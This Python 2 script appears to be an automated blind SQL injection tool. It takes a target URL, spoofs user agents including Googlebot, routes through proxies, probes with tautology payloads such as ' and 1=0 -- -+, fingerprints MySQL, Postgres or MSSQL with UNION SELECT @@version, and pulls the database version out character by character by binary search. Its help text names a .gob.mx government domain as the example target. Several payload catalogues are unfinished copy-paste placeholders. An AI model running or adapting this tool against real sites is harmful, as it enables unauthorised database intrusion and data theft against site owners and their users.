#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit
from random import choice
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
import socks
class Injection:
	Agentes={
	'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
	'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
	'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
	'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
	'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
	'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}
	cabeceras={}
	proxy={}
	cookies = {}
	datos={}
	method = -1 # True = Get method # False = Post method
	server=""
	sufijos = ['#','/*','//','-- a',';']
	Intentos={
		'mysql':[r"' or 4=4"] 
	}
	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	catalogo={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQL={
		'version':["' and   ascii(substring(@@version,1,1))","'","and   ascii(substring(@@version,","))","-- -+"],
		'tablas':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'datos ':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoPostgres={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMSSQL={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoOracle={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	notautos=['and 1=0-- -+']
	SentHeaders = ""
	respuesta = ""

	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		#self.cookie.update({""})
		print galleta

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = self.proxy = {"http":proxy}
	@staticmethod
	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna):
		
		
		caracter = chr(Injection.getMid(up,down))
		print "up: ",up," car: ",ord(caracter)," down:",down
		coord = str(fila)+","+str(columna)
		print "Coordenada: "+coord
		consulta = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if consulta.text == ok:
			return caracter
		elif (consulta.text != ok) and (up == down ):
			return "No encontrado"
		else:
			print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"

			consulta2 = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)

				
			if consulta2.text == ok:
				print "iguales"
				print "up: ",up," down(car): ",ord(caracter)
				print ""
				return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna)
			else:
				print "up(car): ",ord(caracter)," down:",down
				print ""
				down2=down
				if (down2 + 1) == ord(caracter):
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna)
				return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna)
			
		
			
	@staticmethod
	def getMid(up,down):
		return int(((up-down)/2) + down)



	def Begin(self):
		#print self.server, self.cabeceras
		print "Starting Attack\n\n\n"
		sleep(1)
		if self.method:#GET
			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
			print "pagina "+pagina.text
			for tauto in self.notautos:
				print "Query ",tauto
				tautosidad = requests.get(url=self.server+"' and 1=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				tautosidad2 = requests.get(url=self.server+"' and 1=1 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				print tautosidad.text
				print tautosidad2.text
				if (tautosidad.text != pagina.text and tautosidad2.text == pagina.text):
					PGSQLoMySQL = requests.get(url=self.server+"' union select @@version -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
#					print "!",PGSQLoMySQL.text," !! ",pagina.text
					if PGSQLoMySQL.text == pagina.text:
						MSSQLoMySQL = requests.get(url=self.server+"' and True -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
						if MSSQLoMySQL.text == pagina.text:
							database = "mysql"
							print "Base de datos detectada: ",database
							char = ""
							version = ""
							indiceY = 1
							while char != "No encontrado":
								char =self.busqueda(self,self.catalogoMySQL,"version",pagina.text,126,32,indiceY,1)
								print "Caracter: "+char
								if char != "No encontrado":
									version += char
									indiceY = indiceY +1
							print "Version: "+version
							
						else:
							database = "mssql"
							print "Base de datos detectada: ",database
					else:
#						select tablename from pg_tables;
						database = "postgres"
						print "Base de datos detectada: ",database
					for query in self.catalogo.get(database):		
						ciego = requests.get(url=self.server+query,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
				
						if ciego == pagina:
							print query + " ! " + ciego.text + " ! iguales"					
						else:
							print query + " ! " + ciego.text + " ! no iguales"
				else:
					print "Página no vulnerable"
		else:#POST
			pagina = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=self.datos,proxies=self.proxy)
		self.SentHeaders = pagina.request.headers
		self.solicitud = pagina.request.headers
		self.respuesta = pagina.content.lower()
		print "{0} {1} {2}".format(pagina.request.method,pagina.request.path_url,"HTTP/1.1")
		for cabecera in self.solicitud:
			print "{0}:{1}".format(cabecera,self.solicitud.get(cabecera))
#		print self.solicitud
#		print pagina.text


def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"h:v",["request=","user-agent=","method=","random-agent=","data=","proxy="])
	except GetoptError:
		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
		#Server
		elif opt in ('--request'):
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookie'):
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random NO FUNCIONA AUN
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--proxy':
			inject.setProxy(vals)
		#Option not valid
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
		else:
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			exit(1)
	else:
		main()



def main():
	inject.Begin()

	# Response = str(requests.get(server,headers=cabeceras).text).lower()
	# posIni = Response.find('post')
	# posFin = Response.find('</form>',posIni)
	# parametros = Response[posIni:posFin]
	# datos = parametros[parametros.find('<table'):] 
	# print datos
if __name__ == "__main__":
	inject = Injection()
	Opciones(argv)
	#main()
